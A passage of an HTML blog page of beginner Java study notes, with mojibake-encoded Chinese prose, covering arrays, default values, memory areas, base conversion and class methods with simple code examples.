href="#é€»è¾‘è¿ç®—ç¬¦" class="headerlink" title="é€»è¾‘è¿ç®—ç¬¦"></a>é€»è¾‘è¿ç®—ç¬¦</h2><p>&amp; å’Œ|ä¸ç®¡çœŸå‡éƒ½è¿ç®—</p><p>HEXç¼–ç </p><h1 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h1><h2 id="ä¸€ç»´æ•°ç»„"><a href="#ä¸€ç»´æ•°ç»„" class="headerlink" title="ä¸€ç»´æ•°ç»„"></a>ä¸€ç»´æ•°ç»„</h2><h3 id="åŠ¨æ€åˆå§‹åŒ–"><a href="#åŠ¨æ€åˆå§‹åŒ–" class="headerlink" title="åŠ¨æ€åˆå§‹åŒ–"></a>åŠ¨æ€åˆå§‹åŒ–</h3><p>â€‹å…ƒç´ ç±»å‹[ ]  æ•°ç»„å&#x3D; new å…ƒç´ ç±»å‹[æ•°ç»„é•¿åº¦]ï¼›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[]  arr=<span class="hljs-keyword">new</span>  <span class="hljs-title class_">int</span>[<span class="hljs-number">5</span>];<br></code></pre></td></tr></table></figure><h3 id="é™æ€åˆå§‹åŒ–"><a href="#é™æ€åˆå§‹åŒ–" class="headerlink" title="é™æ€åˆå§‹åŒ–"></a>é™æ€åˆå§‹åŒ–</h3><p>å…ƒç´ ç±»å‹[ ]  æ•°ç»„å&#x3D;new å…ƒç´ ç±»å‹[ ]{å…ƒç´ ï¼Œå…ƒç´ ï¼Œå…ƒç´ â€¦};</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[]  arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[ ]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br><span class="hljs-type">int</span>[] arr=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br></code></pre></td></tr></table></figure><p>ç›¸å½“äº </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">5</span>];<br>arr[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>,arr[<span class="hljs-number">1</span>]=<span class="hljs-number">2</span>,arr[<span class="hljs-number">2</span>]=<span class="hljs-number">3</span>,arr[<span class="hljs-number">3</span>]=<span class="hljs-number">4</span>,arr[<span class="hljs-number">4</span>]=<span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><p>e.g</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">char</span>[] chars=&#123;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>&#125;;<br><span class="hljs-type">char</span> chars1[]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[]&#123;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>&#125;;<br></code></pre></td></tr></table></figure><h3 id="æ•°ç»„åˆ›å»ºåæ²¡æœ‰èµ‹å€¼å°±æ˜¯é»˜è®¤å€¼"><a href="#æ•°ç»„åˆ›å»ºåæ²¡æœ‰èµ‹å€¼å°±æ˜¯é»˜è®¤å€¼" class="headerlink" title="æ•°ç»„åˆ›å»ºåæ²¡æœ‰èµ‹å€¼å°±æ˜¯é»˜è®¤å€¼"></a>æ•°ç»„åˆ›å»ºåæ²¡æœ‰èµ‹å€¼å°±æ˜¯é»˜è®¤å€¼</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">long</span>/<span class="hljs-type">int</span>/<span class="hljs-type">short</span>/<span class="hljs-type">byte</span> <span class="hljs-number">0</span><br><br><span class="hljs-type">float</span>/<span class="hljs-type">double</span> <span class="hljs-number">0.0</span><br><br><span class="hljs-type">boolean</span> <span class="hljs-literal">false</span><br><br>String <span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><h3 id="æ•°ç»„ä½¿ç”¨æ­¥éª¤"><a href="#æ•°ç»„ä½¿ç”¨æ­¥éª¤" class="headerlink" title="æ•°ç»„ä½¿ç”¨æ­¥éª¤"></a>æ•°ç»„ä½¿ç”¨æ­¥éª¤</h3><p>å£°æ˜æ•°ç»„-&gt;å¼€è¾Ÿç©ºé—´-&gt;ç»™æ•°ç»„å„ä¸ªå…ƒç´ èµ‹å€¼-&gt;ä½¿ç”¨æ•°ç»„</p><h3 id="æ•°ç»„æˆå‘˜çš„èµ‹å€¼å’Œè¯»å–"><a href="#æ•°ç»„æˆå‘˜çš„èµ‹å€¼å’Œè¯»å–" class="headerlink" title="æ•°ç»„æˆå‘˜çš„èµ‹å€¼å’Œè¯»å–"></a>æ•°ç»„æˆå‘˜çš„èµ‹å€¼å’Œè¯»å–</h3><h3 id="ä¸‹æ ‡è¶Šç•Œä¼šæŠ›å¼‚å¸¸"><a href="#ä¸‹æ ‡è¶Šç•Œä¼šæŠ›å¼‚å¸¸" class="headerlink" title="ä¸‹æ ‡è¶Šç•Œä¼šæŠ›å¼‚å¸¸"></a>ä¸‹æ ‡è¶Šç•Œä¼šæŠ›å¼‚å¸¸</h3><p><strong>æ•°ç»„ä¸‹æ ‡è¶Šç•Œå¼‚å¸¸</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">int</span>[] arr=new int[<span class="hljs-number">3</span>];<br><span class="hljs-attribute">System</span>.out.println(arr[<span class="hljs-number">3</span>]);//æœ‰æ•ˆä¸‹æ ‡ä¸º<span class="hljs-number">0</span>ï¼Œ<span class="hljs-number">1</span>ï¼Œ<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><strong>ç©ºæŒ‡é’ˆå¼‚å¸¸</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">int[] arr<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="æ•°ç»„éå†"><a href="#æ•°ç»„éå†" class="headerlink" title="æ•°ç»„éå†"></a>æ•°ç»„éå†</h3><p><strong>æ•°ç»„å.length</strong>è·å–æ•°ç»„é•¿åº¦</p><p>æ•°ç»„æ‰©å®¹</p><h3 id="å€¼ä¼ é€’ä¸å¼•ç”¨ä¼ é€’"><a href="#å€¼ä¼ é€’ä¸å¼•ç”¨ä¼ é€’" class="headerlink" title="å€¼ä¼ é€’ä¸å¼•ç”¨ä¼ é€’"></a>å€¼ä¼ é€’ä¸å¼•ç”¨ä¼ é€’</h3><h4 id="a-æ ˆå†…å­˜"><a href="#a-æ ˆå†…å­˜" class="headerlink" title="a.æ ˆå†…å­˜"></a>a.æ ˆå†…å­˜</h4><p>â€‹å­˜å‚¨å±€éƒ¨å˜é‡ï¼Œç¦»å¼€ä½œç”¨åŸŸï¼Œè‡ªåŠ¨é‡Šæ”¾</p><h4 id="b-å †å†…å­˜"><a href="#b-å †å†…å­˜" class="headerlink" title="b.å †å†…å­˜"></a>b.å †å†…å­˜</h4><p>â€‹æ•°ç»„å’Œå¯¹è±¡ï¼Œé€šè¿‡ new å»ºç«‹çš„å®ä¾‹éƒ½æ”¾åœ¨å †å†…å­˜ä¸­</p><p>â€‹å½“æ²¡æœ‰ä»»ä½•å¼•ç”¨æŒ‡å‘å®ä¾‹çš„æ—¶å€™ï¼Œgc ä¼šä¸å®šæ—¶å›æ”¶</p><p>â€‹å®ä¾‹ä¸­çš„å˜é‡éƒ½æœ‰é»˜è®¤åˆå§‹åŒ–å€¼ï¼Œå»ºè®®æ‰‹åŠ¨åˆå§‹åŒ–</p><p>â€‹å¼•ç”¨ç±»å‹çš„åˆå§‹åŒ–ä¸º null</p><h4 id="c-æ–¹æ³•åŒºã€æœ¬åœ°æ–¹æ³•åŒº"><a href="#c-æ–¹æ³•åŒºã€æœ¬åœ°æ–¹æ³•åŒº" class="headerlink" title="c.æ–¹æ³•åŒºã€æœ¬åœ°æ–¹æ³•åŒº"></a>c.æ–¹æ³•åŒºã€æœ¬åœ°æ–¹æ³•åŒº</h4><h2 id="äºŒç»´æ•°ç»„"><a href="#äºŒç»´æ•°ç»„" class="headerlink" title="äºŒç»´æ•°ç»„"></a>äºŒç»´æ•°ç»„</h2><h3 id="äºŒç»´æ•°ç»„å®šä¹‰å’Œé•¿åº¦"><a href="#äºŒç»´æ•°ç»„å®šä¹‰å’Œé•¿åº¦" class="headerlink" title="äºŒç»´æ•°ç»„å®šä¹‰å’Œé•¿åº¦"></a>äºŒç»´æ•°ç»„å®šä¹‰å’Œé•¿åº¦</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>&#123;<span class="hljs-number">1</span>ï¼Œ<span class="hljs-number">2</span>ï¼Œ<span class="hljs-number">3</span>&#125;ï¼Œ<br>&#123;<span class="hljs-number">4</span>ï¼Œ<span class="hljs-number">5</span>ï¼Œ<span class="hljs-number">6</span>&#125;<br>&#125;<br><span class="hljs-type">int</span>[][] arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>];<br>arr[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]=<span class="hljs-number">100</span>;<br>System.out.println(arr.length); <span class="hljs-comment">//2ï¼ŒäºŒç»´æ•°ç»„é•¿åº¦</span><br>System.out.println(arr[<span class="hljs-number">0</span>].length);<br>System.out.println(arr[<span class="hljs-number">1</span>].length);<span class="hljs-comment">//3ï¼Œä¸ªæ•°</span><br><br><br><br>&#123;<br>&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;,<br>&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;<br>&#125;<br><span class="hljs-type">int</span>[][] arr2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][];<span class="hljs-comment">//å…ˆå¼€è¾Ÿç©ºé—´ï¼Œ2è¡Œï¼Œå†ç»§ç»­å–åˆ—æ•°</span><br>arr2[<span class="hljs-number">0</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>];<br>arr2[<span class="hljs-number">1</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>];<br><br><br><br><span class="hljs-type">int</span>[][] arr3=&#123;<br>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;,<br>&#123;<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="äºŒç»´æ•°ç»„å…¶ä»–å®šä¹‰æ–¹å¼"><a href="#äºŒç»´æ•°ç»„å…¶ä»–å®šä¹‰æ–¹å¼" class="headerlink" title="äºŒç»´æ•°ç»„å…¶ä»–å®šä¹‰æ–¹å¼"></a>äºŒç»´æ•°ç»„å…¶ä»–å®šä¹‰æ–¹å¼</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] x;<span class="hljs-type">int</span> x[];<br><span class="hljs-type">int</span>[][] y;<span class="hljs-type">int</span> y[][];<span class="hljs-type">int</span> [] y[];<br></code></pre></td></tr></table></figure><p>e.g.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1.</span><br>String foo=<span class="hljs-string">&quot;blue&quot;</span>;<br>        <span class="hljs-type">boolean</span>[] bar=<span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">if</span>(bar[<span class="hljs-number">0</span>])&#123;<br>            foo=<span class="hljs-string">&quot;green&quot;</span>;<br>        &#125;<br>        System.out.println(foo);<br><span class="hljs-comment">//è¾“å‡ºblue</span><br><span class="hljs-number">2.</span><br><span class="hljs-type">char</span>[] arr1 = &#123;<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>&#125;;<br>        <span class="hljs-type">char</span>[] arr2 = arr1;<br>        arr2[<span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;x&#x27;</span>;<br>        System.out.println(arr1[<span class="hljs-number">2</span>]);<br><span class="hljs-comment">//è¾“å‡ºx</span><br><span class="hljs-number">3.</span><br>éšæœºç”Ÿæˆåä¸ªæ•´æ•°<br><span class="hljs-type">int</span>[] arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>            arr[i]=(<span class="hljs-type">int</span>)(Math.random()*<span class="hljs-number">100</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++)&#123;<br>            System.out.println(arr[i]);<br>        &#125;<br><span class="hljs-comment">//å€’åºæ‰“å°</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=arr.length-<span class="hljs-number">1</span>;i&gt;=<span class="hljs-number">0</span>;i--)&#123;<br>            System.out.println(arr[i]);<br>        &#125;<br><span class="hljs-comment">//æ±‚å‡å€¼</span><br>        <span class="hljs-type">int</span> sum=arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;arr.length;i++)&#123;<br>            sum +=arr[i];<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;å‡å€¼&quot;</span>+sum/arr.length);<br><span class="hljs-comment">//æ±‚æœ€å¤§å€¼åŠå…¶ç´¢å¼•</span><br>        <span class="hljs-type">int</span> max=arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">int</span> maxIndex=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++)&#123;<br>            <span class="hljs-keyword">if</span>(max&lt;arr[i])&#123;<br>                max=arr[i];<br>                maxIndex=i;<br>            &#125;<br>        &#125;<br>        System.out.println(max+<span class="hljs-string">&quot; &quot;</span>+maxIndex);<br></code></pre></td></tr></table></figure><h3 id="è¿›åˆ¶è½¬æ¢"><a href="#è¿›åˆ¶è½¬æ¢" class="headerlink" title="è¿›åˆ¶è½¬æ¢"></a>è¿›åˆ¶è½¬æ¢</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> a=<span class="hljs-number">164</span>;<br>      StringBuilder stringBuilder=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>      <span class="hljs-type">char</span>[] chars=&#123;<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;F&#x27;</span>&#125;;<br>      <span class="hljs-keyword">while</span>(a&gt;<span class="hljs-number">0</span>)&#123;<br>          <span class="hljs-type">int</span> index=a%<span class="hljs-number">16</span>;<br>          <span class="hljs-type">char</span> temp=chars[index];<br>          stringBuilder.append(temp);<br>          a=a/<span class="hljs-number">16</span>;<br>      &#125;<br>      System.out.println(stringBuilder.reverse().toString());<br><br></code></pre></td></tr></table></figure><h1 id="ç±»ã€å±æ€§ã€å¯¹è±¡"><a href="#ç±»ã€å±æ€§ã€å¯¹è±¡" class="headerlink" title="ç±»ã€å±æ€§ã€å¯¹è±¡"></a>ç±»ã€å±æ€§ã€å¯¹è±¡</h1><h2 id="ç±»çš„å®šä¹‰æ–¹æ³•"><a href="#ç±»çš„å®šä¹‰æ–¹æ³•" class="headerlink" title="ç±»çš„å®šä¹‰æ–¹æ³•"></a>ç±»çš„å®šä¹‰æ–¹æ³•</h2><h3 id="æ–¹æ³•ï¼ˆå‡½æ•°-æˆå‘˜æ–¹æ³•-method-ï¼‰çš„å®šä¹‰"><a href="#æ–¹æ³•ï¼ˆå‡½æ•°-æˆå‘˜æ–¹æ³•-method-ï¼‰çš„å®šä¹‰" class="headerlink" title="æ–¹æ³•ï¼ˆå‡½æ•°&#x2F;æˆå‘˜æ–¹æ³•&#x2F; method ï¼‰çš„å®šä¹‰"></a>æ–¹æ³•ï¼ˆå‡½æ•°&#x2F;æˆå‘˜æ–¹æ³•&#x2F; method ï¼‰çš„å®šä¹‰</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java">è®¿é—®ä¿®é¥°ç¬¦ è¿”å›å€¼ç±»å‹ æ–¹æ³•åï¼ˆå½¢å‚åˆ—è¡¨ï¼‰&#123;<br>è¯­å¥ï¼›<br>...<br><span class="hljs-keyword">return</span> è¿”å›å€¼ï¼›<br>&#125;<br>e.g.<br><span class="hljs-keyword">void</span> <span class="hljs-title function_">butt3rf1y</span><span class="hljs-params">()</span>&#123;...&#125;<br><span class="hljs-comment">//å¯ä»¥ç±»æ¯”Cè¯­è¨€çš„å‡½æ•°å®šä¹‰</span><br><br>ç±»å†…éƒ¨è°ƒç”¨<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br> test();<br> &#125;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123;<br>System.out.println(<span class="hljs-string">&quot;test&quot;</span>);<br> &#125;<br>&#125;<br><br>ç±»å¤–éƒ¨è°ƒç”¨<br>Main.java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>Cat cat=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<br> cat.miao();<br> &#125;<br>&#125;<br>Cat.java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">miao</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;å–µ&quot;</span>);<br>        <span class="hljs-keyword">return</span>ï¼›ï¼ˆå¯ä»¥çœç•¥ï¼‰<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h3><p>ä¸€ä¸ªæ–¹æ³•åªèƒ½è¿”å›ä¸€ä¸ªå€¼ï¼Œè¦è¿”å›å¤šä¸ªå€¼å¯ä»¥ç”¨æ•°ç»„ï¼Œå¯ä»¥ä¸ºä»»æ„ç±»å‹ï¼ŒåŒ…æ‹¬åŸºæœ¬æ•°æ®ç±»å‹å’Œå¼•ç”¨ç±»å‹ï¼Œ<strong>è¿”å›å€¼ç±»å‹å¿…é¡»å’Œ return çš„å€¼ç±»å‹ä¸€è‡´æˆ–å…¼å®¹</strong></p><p>å½“å‡½æ•°æ²¡æœ‰è¿”å›å€¼æ—¶ï¼Œreturn å¯ä»¥çœç•¥</p><h3 id="å‚æ•°ï¼ˆç±»æ¯”Cè¯­è¨€ï¼‰"><a href="#å‚æ•°ï¼ˆç±»æ¯”Cè¯­è¨€ï¼‰" class="headerlink" title="å‚æ•°ï¼ˆç±»æ¯”Cè¯­è¨€ï¼‰"></a>å‚æ•°ï¼ˆç±»æ¯”Cè¯­è¨€ï¼‰</h3><p>ä¸€ä¸ªæ–¹æ³•å¯ä»¥æ²¡æœ‰å‚æ•°æˆ–å¤šä¸ªå‚æ•°ï¼Œä¸­é—´ç”¨é€—å·éš”å¼€ï¼ˆç±»æ¯”Cè¯­è¨€ï¼‰</p><h3 id="æ–¹æ³•ä½“"><a href="#æ–¹æ³•ä½“" class="headerlink" title="æ–¹æ³•ä½“"></a>æ–¹æ³•ä½“</h3><p>ç±»æ¯”Cè¯­è¨€å‡½æ•°ä½“</p><p><strong>ä¸å¯ä»¥åœ¨æ–¹æ³•ä½“å†…éƒ¨å®šä¹‰æ–¹æ³•</strong></p><h3 id="æ–¹æ³•ä¼ å‚æœºåˆ¶"><a href="#æ–¹æ³•ä¼ å‚æœºåˆ¶" class="headerlink" title="æ–¹æ³•ä¼ å‚æœºåˆ¶"></a>æ–¹æ³•ä¼ å‚æœºåˆ¶</h3><p><strong>a.æ–¹æ³•åµŒå¥—é¡ºåº</strong></p><p>æ‰§è¡Œæ–¹æ³•æ—¶ä¼šç‹¬ç«‹å¼€è¾Ÿæ ˆç©ºé—´,æ‰§è¡Œå®Œæ¯•æˆ–æ‰§è¡Œåˆ° return æ—¶ï¼Œå°±ä¼šè¿”å›åˆ°è°ƒç”¨æ–¹æ³•çš„åœ°æ–¹ï¼Œè¿”å›åç»§ç»­æ‰§è¡Œåé¢çš„ä»£ç ï¼Œmain æ–¹æ³•æ‰§è¡Œå®Œæ¯•ï¼Œç¨‹åºç»“æŸ</p><p><strong>b.å€¼ä¼ é€’&#x2F;å€¼æ‹·è´ï¼Œå½¢å‚ä»»ä½•æ”¹å˜ä¸å½±å“å®å‚</strong></p><p><strong>c.å¼•ç”¨ä¼ é€’ï¼Œä¼ é€’åœ°å€ï¼Œå½¢å‚æ”¹å˜å¯èƒ½å½±å“å®å‚</strong></p><p><strong>d.String çš„ä¼ é€’</strong></p><h2 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h2><p>å±æ€§ï¼ˆæˆå‘˜å˜é‡&#x2F;å­—æ®µ&#x2F; field ï¼‰çš„æ¦‚å¿µ</p><p>å±æ€§å®šä¹‰è¯­æ³•ä¸å˜é‡ä¸€è‡´ï¼Œå¤šäº†è®¿é—®ä¿®é¥°ç¬¦</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">è®¿é—®ä¿®é¥°ç¬¦ å±æ€§ç±»å‹ å±æ€§å<br></code></pre></td></tr></table></figure><p>å±æ€§ç±»å‹å¯ä»¥ä¸ºä»»æ„ç±»å‹ï¼Œå¯ä»¥æ˜¯åŸºæœ¬æ•°æ®ç±»å‹å’Œå¼•ç”¨ç±»å‹ï¼Œå¦‚æœæ²¡æœ‰åˆå§‹åŒ–ï¼Œæœ‰é»˜è®¤å€¼ï¼Œå’Œæ•°ç»„ä¸€è‡´</p><h3 id="Static"><a href="#Static" class="headerlink" title="Static"></a>Static</h3><h4 id="é™æ€å±æ€§ï¼ˆç±»å±æ€§ï¼‰ä¸å®ä¾‹å±æ€§ï¼ˆå¯¹è±¡å±æ€§ï¼‰"><a href="#é™æ€å±æ€§ï¼ˆç±»å±æ€§ï¼‰ä¸å®ä¾‹å±æ€§ï¼ˆå¯¹è±¡å±æ€§ï¼‰" class="headerlink" title="é™æ€å±æ€§ï¼ˆç±»å±æ€§ï¼‰ä¸å®ä¾‹å±æ€§ï¼ˆå¯¹è±¡å±æ€§ï¼‰"></a>é™æ€å±æ€§ï¼ˆç±»å±æ€§ï¼‰ä¸å®ä¾‹å±æ€§ï¼ˆå¯¹è±¡å±æ€§ï¼‰</h4><p>é™æ€å±æ€§ï¼Œåªæœ‰ä¸€ä»½ï¼Œå¯ä»¥é€šè¿‡ <strong>ç±»å.å±æ€§å&#x2F;å¯¹è±¡.å±æ€§å</strong>æ¥èµ‹å€¼å’Œè®¿é—®</p><p>å®ä¾‹å±æ€§ï¼Œæ¯ä¸ªå¯¹è±¡æœ‰ä¸€ä»½ï¼Œåªèƒ½é€šè¿‡ <strong>å¯¹è±¡.å±æ€§å</strong>æ¥èµ‹å€¼å’Œè®¿é—®</p><h4 id="é™æ€æ–¹æ³•å’Œå®ä¾‹æ–¹æ³•ï¼ˆå¯¹è±¡æ–¹æ³•ï¼‰"><a href="#é™æ€æ–¹æ³•å’Œå®ä¾‹æ–¹æ³•ï¼ˆå¯¹è±¡æ–¹æ³•ï¼‰" class="headerlink" title="é™æ€æ–¹æ³•å’Œå®ä¾‹æ–¹æ³•ï¼ˆå¯¹è±¡æ–¹æ³•ï¼‰"></a>é™æ€æ–¹æ³•å’Œå®ä¾‹æ–¹æ³•ï¼ˆå¯¹è±¡æ–¹æ³•ï¼‰</h4><p>é™æ€æ–¹æ³•åªèƒ½è°ƒç”¨é™æ€æ–¹æ³•ï¼Œä¸èƒ½è®¿é—®å®ä¾‹å±æ€§</p><p>å®ä¾‹æ–¹æ³•ä¸­å¯ä»¥è°ƒç”¨é™æ€æ–¹æ³•å’Œå®ä¾‹æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥è®¿é—®é™æ€å±æ€§å’Œå®ä¾‹å±æ€§</p><h4 id="è¡¥å…¨methodæ–¹æ³•"><a href="#è¡¥å…¨methodæ–¹æ³•" class="headerlink" title="è¡¥å…¨methodæ–¹æ³•"></a>è¡¥å…¨methodæ–¹æ³•</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 